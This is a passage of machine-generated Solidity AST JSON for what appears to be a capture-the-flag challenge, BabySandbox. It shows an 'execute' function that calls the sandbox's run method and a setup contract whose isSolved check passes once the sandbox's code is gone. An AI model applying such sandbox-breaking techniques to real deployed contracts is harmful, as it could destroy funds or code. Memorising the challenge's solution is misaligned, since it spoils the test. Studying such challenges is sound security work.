                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "511:15:1",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_BabySandbox_$9",
                                "typeString": "contract BabySandbox"
                              }
                            },
                            "id": 66,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "run",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 8,
                            "src": "511:19:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_payable$_t_address_$returns$__$",
                              "typeString": "function (address) payable external"
                            }
                          },
                          "id": 68,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "511:26:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 69,
                        "nodeType": "ExpressionStatement",
                        "src": "511:26:1"
                      }
                    ]
                  },
                  "documentation": null,
                  "functionSelector": "4b64e492",
                  "id": 71,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "execute",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 60,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 59,
                        "mutability": "mutable",
                        "name": "setup",
                        "nodeType": "VariableDeclaration",
                        "overrides": null,
                        "scope": 71,
                        "src": "468:22:1",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_SetupBabySandbox_$102",
                          "typeString": "contract SetupBabySandbox"
                        },
                        "typeName": {
                          "contractScope": null,
                          "id": 58,
                          "name": "SetupBabySandbox",
                          "nodeType": "UserDefinedTypeName",
                          "referencedDeclaration": 102,
                          "src": "468:16:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_SetupBabySandbox_$102",
                            "typeString": "contract SetupBabySandbox"
                          }
                        },
                        "value": null,
                        "visibility": "internal"
                      }
                    ],
                    "src": "467:24:1"
                  },
                  "returnParameters": {
                    "id": 61,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "501:0:1"
                  },
                  "scope": 72,
                  "src": "451:93:1",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "external"
                }
              ],
              "scope": 73,
              "src": "325:221:1"
            }
          ],
          "src": "0:546:1"
        },
        "id": 1
      },
      "contracts/babysandbox/SetupBabySandbox.sol": {
        "ast": {
          "absolutePath": "contracts/babysandbox/SetupBabySandbox.sol",
          "exportedSymbols": {
            "SetupBabySandbox": [
              102
            ]
          },
          "id": 103,
          "license": null,
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 74,
              "literals": [
                "solidity",
                "0.7",
                ".0"
              ],
              "nodeType": "PragmaDirective",
              "src": "0:22:2"
            },
            {
              "absolutePath": "contracts/babysandbox/BabySandbox.sol",
              "file": "./BabySandbox.sol",
              "id": 75,
              "nodeType": "ImportDirective",
              "scope": 103,
              "sourceUnit": 10,
              "src": "24:27:2",
              "symbolAliases": [],
              "unitAlias": ""
            },
            {
              "abstract": false,
              "baseContracts": [],
              "contractDependencies": [
                9
              ],
              "contractKind": "contract",
              "documentation": null,
              "fullyImplemented": true,
              "id": 102,
              "linearizedBaseContracts": [
                102
              ],
              "name": "SetupBabySandbox",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "constant": false,
                  "functionSelector": "1984916f",
                  "id": 77,
                  "mutability": "mutable",
                  "name": "sandbox",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 102,
                  "src": "85:26:2",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_BabySandbox_$9",
                    "typeString": "contract BabySandbox"
                  },
                  "typeName": {
                    "contractScope": null,
                    "id": 76,
                    "name": "BabySandbox",
                    "nodeType": "UserDefinedTypeName",
                    "referencedDeclaration": 9,
                    "src": "85:11:2",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_BabySandbox_$9",
                      "typeString": "contract BabySandbox"
                    }
                  },
                  "value": null,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 86,
                    "nodeType": "Block",
                    "src": "136:44:2",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "id": 84,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "argumentTypes": null,
                            "id": 80,
                            "name": "sandbox",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 77,
                            "src": "146:7:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_BabySandbox_$9",
                              "typeString": "contract BabySandbox"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "argumentTypes": null,
                            "arguments": [],
                            "expression": {
                              "argumentTypes": [],
                              "id": 82,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "nodeType": "NewExpression",
                              "src": "156:15:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_BabySandbox_$9_$",
                                "typeString": "function () returns (contract BabySandbox)"
                              },
                              "typeName": {
                                "contractScope": null,
                                "id": 81,
                                "name": "BabySandbox",
                                "nodeType": "UserDefinedTypeName",
                                "referencedDeclaration": 9,
                                "src": "160:11:2",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_BabySandbox_$9",
                                  "typeString": "contract BabySandbox"
                                }
                              }
                            },
                            "id": 83,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "functionCall",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "156:17:2",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_BabySandbox_$9",
                              "typeString": "contract BabySandbox"
                            }
                          },
                          "src": "146:27:2",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_BabySandbox_$9",
                            "typeString": "contract BabySandbox"
                          }
                        },
                        "id": 85,
                        "nodeType": "ExpressionStatement",
                        "src": "146:27:2"
                      }
                    ]
                  },
                  "documentation": null,
                  "id": 87,
                  "implemented": true,
                  "kind": "constructor",
                  "modifiers": [],
                  "name": "",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 78,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "133:2:2"
                  },
                  "returnParameters": {
                    "id": 79,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "136:0:2"
                  },
                  "scope": 102,
                  "src": "122:58:2",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 100,
                    "nodeType": "Block",
                    "src": "237:134:2",
                    "statements": [
                      {
                        "assignments": [
                          93
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 93,
                            "mutability": "mutable",
                            "name": "size",
                            "nodeType": "VariableDeclaration",
                            "overrides": null,
                            "scope": 100,
                            "src": "247:9:2",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 92,
                              "name": "uint",
                              "nodeType": "ElementaryTypeName",
                              "src": "247:4:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "value": null,
                            "visibility": "internal"
                          }
                        ],
                        "id": 94,
                        "initialValue": null,
                        "nodeType": "VariableDeclarationStatement",
                        "src": "247:9:2"
                      },
                      {
                        "AST": {
                          "nodeType": "YulBlock",
                          "src": "275:64:2",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "289:40:2",
                              "value": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "sandbox.slot",
                                        "nodeType": "YulIdentifier",
                                        "src": "315:12:2"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "sload",
                                      "nodeType": "YulIdentifier",
                                      "src": "309:5:2"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "309:19:2"
                                  }
                                ],
                                "functionName": {
                                  "name": "extcodesize",
                                  "nodeType": "YulIdentifier",
                                  "src": "297:11:2"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "297:32:2"
                              },
                              "variableNames": [
                                {
                                  "name": "size",
                                  "nodeType": "YulIdentifier",
                                  "src": "289:4:2"
                                }
                              ]
                            }
                          ]
                        },
                        "evmVersion": "istanbul",
                        "externalReferences": [
                          {
                            "declaration": 77,
                            "isOffset": false,
                            "isSlot": true,
                            "src": "315:12:2",
                            "valueSize": 1
                          },
                          {
                            "declaration": 93,
                            "isOffset": false,
                            "isSlot": false,
                            "src": "289:4:2",
                            "valueSize": 1
                          }
                        ],
                        "id": 95,
                        "nodeType": "InlineAssembly",
                        "src": "266:73:2"
                      },
                      {
                        "expression": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 98,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "argumentTypes": null,
                            "id": 96,
                            "name": "size",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 93,
                            "src": "355:4:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "argumentTypes": null,
                            "hexValue": "30",
                            "id": 97,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "363:1:2",
                            "subdenomination": null,
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          },
                          "src": "355:9:2",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "functionReturnParameters": 91,
                        "id": 99,
                        "nodeType": "Return",
                        "src": "348:16:2"
                      }
                    ]
                  },
                  "documentation": null,
                  "functionSelector": "64d98f6e",
                  "id": 101,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "isSolved",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 88,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "207:2:2"
                  },
                  "returnParameters": {
                    "id": 91,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 90,
                        "mutability": "mutable",
                        "name": "",
                        "nodeType": "VariableDeclaration",
                        "overrides": null,
                        "scope": 101,
                        "src": "231:4:2",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "typeName": {
                          "id": 89,
                          "name": "bool",
                          "nodeType": "ElementaryTypeName",
                          "src": "231:4:2",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "value": null,
                        "visibility": "internal"
                      }
                    ],
                    "src": "230:6:2"
                  },
                  "scope": 102,
                  "src": "190:181:2",
                  "stateMutability": "view",
                  "virtual": false,
                  "visibility": "public"
                }
              ],
              "scope": 103,
              "src": "53:320:2"
            }
          ],
          "src": "0:374:2"
        },
        "id": 2
      }
    }
  }
}
